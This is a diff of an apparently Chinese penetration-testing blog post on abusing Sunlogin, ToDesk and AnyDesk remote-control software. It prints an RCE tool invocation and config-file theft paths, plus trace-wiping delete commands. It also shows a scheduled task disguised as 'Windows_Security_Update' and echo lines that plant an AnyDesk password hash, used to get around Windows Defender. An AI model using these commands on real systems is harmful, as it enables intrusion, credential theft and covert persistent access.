@@ -11,7 +11,7 @@
   <meta itemprop="name" content="远控软件利用">
   <meta itemprop="datePublished" content="2024-08-15T11:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T11:31:01+08:00">
-  <meta itemprop="wordCount" content="272">
+  <meta itemprop="wordCount" content="260">
   <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/65/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="远控软件利用">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/65\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  272 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  260 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/65\/","datePublished": "2024-08-15T11:31:01+08:00","dateModified": "2024-08-15T11:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>远控软件利用</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 11:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="272 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 11:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="260 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,41 +152,55 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#利用已有向日葵">利用已有向日葵</a>
       <ul>
-        <li></li>
+        <li><a href="#rce">rce</a></li>
+        <li><a href="#读信息">读信息</a></li>
       </ul>
     </li>
+    <li><a href="#传入向日葵攻击">传入向日葵攻击</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#情况1">情况1</a></li>
+    <li><a href="#情况2-计划任务">情况2 计划任务</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="heading" class="heading-element"><span></span>
   <a href="#heading" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h5 id="向日葵" class="heading-element"><span>0.0.0.2  向日葵</span>
+</h1><h1 id="向日葵" class="heading-element"><span>向日葵</span>
   <a href="#%e5%90%91%e6%97%a5%e8%91%b5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><a href="https://drunkmars.top/2021/05/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%90%91%E6%97%A5%E8%91%B5%E5%A6%99%E7%94%A8/"target="_blank" rel="external nofollow noopener noreferrer">https://drunkmars.top/2021/05/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%90%91%E6%97%A5%E8%91%B5%E5%A6%99%E7%94%A8/</a></p>
-<h6 id="原理" class="heading-element"><span>0.0.0.2.1  原理</span>
+</h1><p><a href="https://drunkmars.top/2021/05/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%90%91%E6%97%A5%E8%91%B5%E5%A6%99%E7%94%A8/"target="_blank" rel="external nofollow noopener noreferrer">https://drunkmars.top/2021/05/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%90%91%E6%97%A5%E8%91%B5%E5%A6%99%E7%94%A8/</a></p>
+<h2 id="原理" class="heading-element"><span>原理</span>
   <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>远程控制，==主控端电脑只是将键盘和鼠标的指令传送给远程电脑，同时将被控端电脑的屏幕画面通过通信线路回传过来==。也就是说，控制被控端电脑进行操作似乎是在眼前的电脑上进行的，实质是在远程的电脑中实现的</p>
-<h6 id="利用已有向日葵" class="heading-element"><span>0.0.0.2.2  利用已有向日葵</span>
+</h2><p>远程控制，==主控端电脑只是将键盘和鼠标的指令传送给远程电脑，同时将被控端电脑的屏幕画面通过通信线路回传过来==。也就是说，控制被控端电脑进行操作似乎是在眼前的电脑上进行的，实质是在远程的电脑中实现的</p>
+<h2 id="利用已有向日葵" class="heading-element"><span>利用已有向日葵</span>
   <a href="#%e5%88%a9%e7%94%a8%e5%b7%b2%e6%9c%89%e5%90%91%e6%97%a5%e8%91%b5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### rce</p>
-<p><a href="https://github.com/Mr-xn/sunlogin_rce"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Mr-xn/sunlogin_rce</a></p>
+</h2><h3 id="rce" class="heading-element"><span>rce</span>
+  <a href="#rce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://github.com/Mr-xn/sunlogin_rce"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Mr-xn/sunlogin_rce</a></p>
 <pre tabindex="0"><code>./xrkRce -h 192.168.50.45 -t scan
 ./xrkRce -h 192.168.50.46 -t rce -p 62383 -c &#34;whoami&#34;
 
 -h 指定目标
 -t 选择扫描或者命令执行  默认scan
 -p 设置扫描端口范围 默认4w到65535
--c 需要执行的命令</code></pre><p>####### 读信息</p>
-<p>在向日葵高于 12.5.3.* 的已经没有办法获取 secert 了</p>
+-c 需要执行的命令</code></pre><h3 id="读信息" class="heading-element"><span>读信息</span>
+  <a href="#%e8%af%bb%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在向日葵高于 12.5.3.* 的已经没有办法获取 secert 了</p>
 <p>向日葵默认配置文件路径:</p>
 <pre tabindex="0"><code>安装版：C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini    
 便携版：C:\\ProgramData\\Oray\\SunloginClient\\config.ini    
@@ -214,17 +228,17 @@ rmdir /s /q C:\ProgramData\Oray\SunloginClient
 rmdir /s /q %userprofile%\AppData\Roaming\Oray\SunloginClient
 reg delete &#34;HKCU\Software\Oray\SunLogin\SunloginClient&#34; /f
 reg delete &#34;HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run&#34; /v SunloginClient /f
-del /s /q SunloginClient.exe</code></pre><h6 id="传入向日葵攻击" class="heading-element"><span>0.0.0.2.3  传入向日葵攻击</span>
+del /s /q SunloginClient.exe</code></pre><h2 id="传入向日葵攻击" class="heading-element"><span>传入向日葵攻击</span>
   <a href="#%e4%bc%a0%e5%85%a5%e5%90%91%e6%97%a5%e8%91%b5%e6%94%bb%e5%87%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>给机器传入绿色版向日葵，运行向日葵之后读取配置，或是传入有rce漏洞的向日葵，直接运行传入的这个exe就好(试了一下不是直接以绿色版运行的)</p>
+</h2><p>给机器传入绿色版向日葵，运行向日葵之后读取配置，或是传入有rce漏洞的向日葵，直接运行传入的这个exe就好(试了一下不是直接以绿色版运行的)</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091130485.webp" alt="image-20240109113003856" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091130485.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091130485.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091130485.webp?size=large 2x" data-title="image-20240109113003856" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="todesk" class="heading-element"><span>0.0.0.3  todesk</span>
+<h1 id="todesk" class="heading-element"><span>todesk</span>
   <a href="#todesk" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>常见渗透方式（偷配置，百试百灵）</p>
+</h1><p>常见渗透方式（偷配置，百试百灵）</p>
 <p>这里还是和前面的向日葵一样，可以进行配置文件的窃取，默认安装路径 C:\Program Files\ToDesk\config.ini</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091140501.webp" alt="image-20240109114024856" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091140501.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091140501.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091140501.webp?size=large 2x" data-title="image-20240109114024856" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这里咱们可以攻击机安装 todesk，然后读取到 config.ini 中的配置文件，然后和攻击机进行替换即可。</p>
@@ -235,11 +249,11 @@ del /s /q SunloginClient.exe</code></pre><h6 id="传入向日葵攻击" class="h
 <p>两个机器密码相同（进行替换的时候需要修改攻击机密码更新频率）</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091141859.webp" alt="image-20240109114146141" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091141859.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091141859.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091141859.webp?size=large 2x" data-title="image-20240109114146141" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091142540.webp" alt="image-20240109114200861" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091142540.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091142540.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091142540.webp?size=large 2x" data-title="image-20240109114200861" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="anydesk" class="heading-element"><span>0.0.0.4  anydesk</span>
+<h1 id="anydesk" class="heading-element"><span>anydesk</span>
   <a href="#anydesk" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>优点：
 整个过程都不需要进行 UAC 弹窗，真正实现了无感绕过</p>
 <p>缺点：</p>
@@ -248,11 +262,11 @@ del /s /q SunloginClient.exe</code></pre><h6 id="传入向日葵攻击" class="h
 </blockquote>
 <p>anydesk 的配置文件在以下文件中，而通常这个时候我们有权限修改 anydesk 的配置文件。</p>
 <pre tabindex="0"><code>C:\Users\用户名\AppData\Roaming\AnyDesk</code></pre><p>这里进行测试，起两个虚拟机，设定一个场景（攻击机拿到了 webshell，受害机开着 windows defender，如何去渗透拿到受害机权限）</p>
-<pre tabindex="0"><code>攻击机ip: 10.211.55.3 + 10.211.55.2受害机ip: 10.211.55.4（windows defender全开）</code></pre><h6 id="情况1" class="heading-element"><span>0.0.0.4.1  情况1</span>
+<pre tabindex="0"><code>攻击机ip: 10.211.55.3 + 10.211.55.2受害机ip: 10.211.55.4（windows defender全开）</code></pre><h2 id="情况1" class="heading-element"><span>情况1</span>
   <a href="#%e6%83%85%e5%86%b51" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>这里拿到了受害机的 webshell，是个普通权限，无法去关闭</p>
+</h2><p>这里拿到了受害机的 webshell，是个普通权限，无法去关闭</p>
 <p>这里可以看到有 windows defender 来运行，这里无法进行关闭 windows defender</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091143586.webp" alt="image-20240109114318951" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091143586.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091143586.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091143586.webp?size=large 2x" data-title="image-20240109114318951" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这里用 powershell 执行远程命令下载 anydesk 到用户的目录中去，因为虚拟机只有 C 盘，所以创建了一个目录来存放，<strong>在真实的渗透过程中，一般是有 RWE 的目录</strong></p>
@@ -268,22 +282,22 @@ del /s /q SunloginClient.exe</code></pre><h6 id="传入向日葵攻击" class="h
 <p>(4) 重新打开攻击机，生成配置文件，启动受害机的 anydesk。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091144055.webp" alt="image-20240109114442495" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091144055.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091144055.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091144055.webp?size=large 2x" data-title="image-20240109114442495" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>(5) 用攻击机进行连接，这里连接的 id 就是（2）中截图的 id，密码就是（2）中设置的密码即可成功无感绕过 windows defender</p>
-<h6 id="情况2-计划任务" class="heading-element"><span>0.0.0.4.2  情况2 计划任务</span>
+<h2 id="情况2-计划任务" class="heading-element"><span>情况2 计划任务</span>
   <a href="#%e6%83%85%e5%86%b52-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>(1) 确定用户创建计划任务</p>
+</h2><p>(1) 确定用户创建计划任务</p>
 <p>如果命令行不能去执行，则可以去创建计划任务去执行，例如，必须先确定当前用户，在当前用户的目录下执行 anydesk</p>
 <pre tabindex="0"><code>powershell &#34;(((Get-WmiObject -Class Win32\_Process -Filter &#39;Name=\\&#34;explorer.exe\\&#34;&#39;).GetOwner().user) -split &#39;\&#39;)\[0\]schtasks /Create /TN Windows\_Security\_Update /SC monthly /tr &#34;C:\\Users\\testuser.G1TS\\Desktop\\anydesk.exe&#34; /RU 用户名</code></pre><p>执行计划任务</p>
 <pre tabindex="0"><code>schtasks /run /tn Windows\_Security\_Update</code></pre><p>后续步骤和上面相同</p>
 <p>然后添加密码到配置文件中去即可。</p>
 <pre tabindex="0"><code>echo ad.anynet.pwd_hash=85352d14ed8d515103f6af88dd68db7573a37ae0f9c9d2952c3a63a8220a501c &gt;&gt; C:\Users\用户目录\AppData\Roaming\AnyDesk\service.confecho ad.anynet.pwd_salt=cb65156829a1d5a7281bfe8f6c98734a &gt;&gt; C:\Users\用户目录\AppData\Roaming\AnyDesk\service.conf</code></pre><p>然后查看用户的 id</p>
 <pre tabindex="0"><code>type C:\Users\用户名\AppData\Roaming\AnyDesk\system.conf</code></pre><p>连接即可</p>
-<h5 id="gotohttp" class="heading-element"><span>0.0.0.5  gotohttp</span>
+<h1 id="gotohttp" class="heading-element"><span>gotohttp</span>
   <a href="#gotohttp" class="heading-mark">
